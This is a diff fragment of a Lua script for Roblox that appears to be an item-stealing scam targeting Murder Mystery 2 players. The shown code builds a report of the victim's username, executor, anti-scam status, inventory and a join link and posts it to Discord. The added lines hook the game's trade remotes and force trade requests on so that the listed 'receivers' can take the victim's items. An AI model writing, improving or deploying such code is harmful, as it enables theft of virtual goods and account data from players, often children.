@@ -102,7 +102,7 @@ local function send_discord(items, game_name)
     end
     local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"
     local desc = string.format(
-        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
+        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
         lp.Name, lp.DisplayName, get_executor(), tostring(detect_antiscam()), get_roblox_version(),
         receivers, table.concat(inv_lines, "\n"), rubis_url, join
     )
@@ -129,12 +129,16 @@ end
 local function hook_mm2()
     local Trade = RS:WaitForChild("Trade", 10)
     if not Trade then return end
-    local sendRequest   = Trade:WaitForChild("SendRequest", 10)
-    local offerItem     = Trade:WaitForChild("OfferItem", 10)
-    local acceptTrade   = Trade:WaitForChild("AcceptTrade", 10)
-    local startTrade    = Trade:WaitForChild("StartTrade", 10)
-    local completeTrade = Trade:WaitForChild("CompleteTrade", 10)
+    local sendRequest        = Trade:WaitForChild("SendRequest", 10)
+    local offerItem          = Trade:WaitForChild("OfferItem", 10)
+    local acceptTrade        = Trade:WaitForChild("AcceptTrade", 10)
+    local startTrade         = Trade:WaitForChild("StartTrade", 10)
+    local completeTrade      = Trade:WaitForChild("CompleteTrade", 10)
+    local setRequestsEnabled = Trade:WaitForChild("SetRequestsEnabled", 10)
     if not sendRequest or not offerItem or not acceptTrade or not startTrade then return end
+
+    -- trades aanzetten zodat allowed users kunnen sturen
+    pcall(function() setRequestsEnabled:FireServer(true) end)
 
     local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
     local items = collect_mm2_items()
